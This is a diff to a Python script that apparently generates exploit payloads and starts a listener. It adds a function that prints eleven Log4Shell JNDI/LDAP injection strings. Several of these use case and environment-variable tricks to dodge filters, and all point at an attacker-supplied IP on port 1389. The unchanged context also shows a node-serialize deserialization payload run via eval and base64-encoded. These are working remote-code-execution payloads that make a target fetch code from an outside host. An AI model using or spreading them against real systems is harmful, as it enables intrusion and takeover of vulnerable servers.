@@ -120,6 +120,14 @@ def get_random_string():
 	result_str = ''.join(random.choice(letters) for i in range(20))
 	return result_str
 
+def log4j_list(ip):
+	list_log4j_f = ["$\{jndi:ldap://{IP}:1389/Exploit\}","$\{$\{upper:j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{lower:j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{::-j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{env:ENV_NAME:-j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{env:TROLL:-j\}ndi:ldap://{IP}:1389/Exploit\}","$\{$\{env:TROLL:-j\}ndi:$\{env:TROLL:-l\}dap://{IP}:1389/Exploit\}","$\{$\{env:ENV_NAME:-j\}ndi:lda$\{env:ENV_NAME:-p\}://{IP}:1389/Exploit\}","$\{$\{::-j\}ndi:lda$\{::-p\}://{IP}:1389/Exploit\}","$\{$\{lower:j\}ndi:$\{lower:l\}dap://{IP}:1389/Exploit\}","$\{$\{upper:j\}ndi:$\{lower:l\}dap://{IP}:1389/Exploit\}"]
+	list_log4j = ["${jndi:ldap://{IP}:1389/Exploit}","${${upper:j}ndi:ldap://{IP}:1389/Exploit}","${${lower:j}ndi:ldap://{IP}:1389/Exploit}","${${::-j}ndi:ldap://{IP}:1389/Exploit}","${${env:ENV_NAME:-j}ndi:ldap://{IP}:1389/Exploit}","${${env:TROLL:-j}ndi:ldap://{IP}:1389/Exploit}","${${env:TROLL:-j}ndi:${env:TROLL:-l}dap://{IP}:1389/Exploit}","${${env:ENV_NAME:-j}ndi:lda${env:ENV_NAME:-p}://{IP}:1389/Exploit}","${${::-j}ndi:lda${::-p}://{IP}:1389/Exploit}","${${lower:j}ndi:${lower:l}dap://{IP}:1389/Exploit}","${${upper:j}ndi:${lower:l}dap://{IP}:1389/Exploit}"]
+	for i in list_log4j_f:
+		print(i.replace("{IP}",ip))
+	for i in list_log4j:
+		print(i.replace("{IP}",ip))
+
 # Load variables from updates.yaml
 if len(sys.argv[0].split("/")) > 1:
 	paths = "/".join(sys.argv[0].split("/")[:-1])+"/"
@@ -192,7 +200,8 @@ if __name__ == "__main__":
 			print('{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2)
 			base64payload = '{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2
 			print(f"\n{base64.b64encode(base64payload.encode('ascii')).decode('ascii')}")
-
+		elif "{LOG4J}" in j:
+			log4j_list(ip)
 		else:
 			print(j.strip().replace("{IP}",ip).replace("{PORT}",port))
 	print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {port}\n")
